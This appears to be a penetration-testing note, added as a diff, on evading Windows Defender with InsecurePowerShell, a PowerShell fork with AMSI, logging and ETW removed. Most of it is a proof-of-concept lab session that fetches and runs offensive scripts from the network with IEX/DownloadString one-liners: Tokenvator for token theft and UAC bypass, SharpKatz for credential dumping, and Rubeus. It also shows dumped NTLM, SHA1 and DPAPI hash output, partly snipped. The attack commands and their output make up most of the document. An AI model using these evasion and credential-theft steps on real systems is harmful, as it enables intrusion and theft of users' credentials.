@@ -1,0 +1,220 @@
+=======================================================================================================================================
+Antivirus bypass using the tool 'InsecurePowerShell' (PowerShell fork)
+=======================================================================================================================================
+
+InsecurePowershell is a fork of PowerShell Core v6.0.0, with key security features removed. 
+
+InsecurePowerShell removes the following security features from PowerShell:
+---------------------------------------------------------------------------
+> AMSI - InsecurePowerShell does not submit any PowerShell code to the AMSI, even when there is an actively listening AntiMalware Provider.
+> PowerShell Logging - InsecurePowerShell disables ScriptBlockLogging, Module Logging, and Transcription Logging. Even if they are enabled
+  in Group Policy, these settings are ignored.
+> LanguageModes - InsecurePowerShell always runs PowerShell code in FullLanguage mode. Attempting to set InsecurePowerShell to alternative 
+  LanguageModes, such as ConstrainedLanguage mode or RestrictedLanguage mode does not take any affect.
+> ETW - InsecurePowerShell does not utilize ETW (Event Tracing for Windows).
+
+Sources
+--------
+=> https://github.com/cobbr/InsecurePowerShell
+=> https://github.com/cobbr/InsecurePowerShellHost
+
+=======================================================================================================================================
+PoC - Using 'InsecurePowerShell' to execute several hacking scripts like "Invoke-Tokenvator.ps1', 'Invoke-SharpKatz.ps1' and
+      'Invoke-Rubeus.ps1' without getting detecting by Window Defender on a Windows 10 laptop
+=======================================================================================================================================
+
+PS C:\Temp> ls
+
+    Répertoire : C:\Temp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        19/02/2023     05:21                InsecurePowerShell-v6.0.0-rc.2-win-x64
+d-----        19/02/2023     05:10                InsecurePowerShellHost-v6-x64
+
+
+PS C:\Temp> cd .\InsecurePowerShell-v6.0.0-rc.2-win-x64\
+
+C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64> pwsh.exe
+
+PowerShell v6.0.0-rc.2-67-g642a8fe0eb0b49f4046e434dc16748ea5c963d51
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+https://aka.ms/pscore6-docs
+Type 'help' to get help.
+
+PS C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64> amsiscanbuffer
+
+amsiscanbuffer : The term 'amsiscanbuffer' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ amsiscanbuffer
++ ~~~~~~~~~~~~~~
++ CategoryInfo          : ObjectNotFound: (amsiscanbuffer:String) [], CommandNotFoundException
++ FullyQualifiedErrorId : CommandNotFoundException
+
+
+PS C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64> amsiscanstring
+
+amsiscanstring : The term 'amsiscanstring' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ amsiscanstring
++ ~~~~~~~~~~~~~~
++ CategoryInfo          : ObjectNotFound: (amsiscanstring:String) [], CommandNotFoundException
++ FullyQualifiedErrorId : CommandNotFoundException
+
+
+==================================================
+1. Test with 'Invoke-Tokenvator.ps1'
+==================================================
+
+PS C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Tokenvator.ps1');
+
+PS C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64> Invoke-Tokenvator  
+
+(Tokens) > Name                     Optional            Required
+----                     --------            --------
+Info                     -                   -
+Help                     Command             -                                                                                                                              
+List_Privileges          ProcessID           -                                                                                                                              
+Enable_Privilege         ProcessID           Privilege                                                                                                                      
+Disable_Privilege        ProcessID           Privilege                                                                                                                      
+Remove_Privilege         ProcessID           Privilege                                                                                                                      
+Nuke_Privileges          ProcessID           -                                                                                                                              
+Terminate                ProcessID           -                                                                                                                              
+GetSystem                Command             -                                                                                                                              
+GetTrustedInstaller      Command             -                                                                                                                              
+Steal_Token              Command             ProcessID                                                                                                                      
+Steal_Pipe_Token         Command             PipeName                                                                                                                       
+BypassUAC                ProcessID           Command
+Sample_Processes         -                   -
+Sample_Processes_WMI     -                   -
+Find_User_Processes      -                   User
+Find_User_Processes_WMI  -                   User
+List_Filters             -                   -
+List_Filter_Instances    -                   FilterName
+Detach_Filter            InstanceName        FilterName, VolumeName
+Unload_Filter            -                   FilterName
+Sessions                 -                   -
+WhoAmI                   -                   -
+RevertToSelf             -                   -
+Run                      -                   Command
+RunPowerShell            -                   Command
+
+e.g. (Tokens)> Help List_Filter_Instances
+e.g. (Tokens)> Help Privileges
+
+e.g. (Tokens)> Steal_Token 27015
+e.g. (Tokens)> Steal_Token 27015 cmd.exe
+e.g. (Tokens)> Enable_Privilege SeDebugPrivilege
+e.g. (Tokens)> Enable_Privilege 27015 SeDebugPrivilege
+
+
+PS C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64> Invoke-Tokenvator "Help Privileges"
+
+(Tokens) > SeAssignPrimaryTokenPrivilege
+SeAuditPrivilege
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreatePermanentPrivilege
+SeCreateSymbolicLinkPrivilege
+SeCreateTokenPrivilege
+SeDebugPrivilege
+SeEnableDelegationPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeLockMemoryPrivilege
+SeMachineAccountPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRelabelPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSyncAgentPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTcbPrivilege
+SeTimeZonePrivilege
+SeTrustedCredManAccessPrivilege
+SeUndockPrivilege
+SeUnsolicitedInputPrivilege
+
+
+==================================================
+2. Test with 'Invoke-SharpKatz.ps1'
+==================================================
+
+PS C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1');
+
+PS C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64> Invoke-SharpKatz
+[*]
+[*]                     System Information
+[*] ----------------------------------------------------------------------
+[*] | Platform: Win32NT                                                  |
+[*] ----------------------------------------------------------------------
+[*] | Major: 10            | Minor: 0             | Build: 19045         |
+[*] ----------------------------------------------------------------------
+[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
+[*] ----------------------------------------------------------------------
+[*]
+[*] Authentication Id   : 0;1066468 (00000000:01066468)
+[*] Session             : Interactive from 1
+[*] UserName            : User1
+[*] LogonDomain         : LAB
+[*] LogonServer         : DC2
+[*] LogonTime           : 2023/02/19 00:00:24
+[*] SID                 : S-1-5-21-666114207-261065646-224150901-1121
+[*]
+[*]      Msv
+[*]       Domain   : LAB
+[*]       Username : j-cana
+[*]       LM       : 00000000000000000000000000000000
+[*]       NTLM     : 85a931e082c05f58bd12ccde5d<SNIP>
+[*]       SHA1     : 3312401ebc36e003689df7e359<SNIP>
+[*]       DPAPI    : bba5a02d57ddbc4638558c3a21<SNIP>
+[*]
+[*]      WDigest
+[*]       Hostname : LAB
+[*]       Username : User1
+[*]       Password : [NULL]
+[*]
+[*]      Kerberos
+[*]       Domain   : LAB.LOCAL
+[*]       Username : User1
+[*]       Password : <SNIP>
+[*]
+<SNIP>
+
+
+==================================================
+3. Test with 'Invoke-Rubeus.ps1'
+==================================================
+
+PS C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1');
+
+PS C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64> invoke-rubeus currentluid                                                                                                
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.0
+
+[*] Action: Display current LUID
+
+[*] Current LogonID (LUID) : 0x1045b8 (1066424)
+
+PS C:\Temp\InsecurePowerShell-v6.0.0-rc.2-win-x64>
+
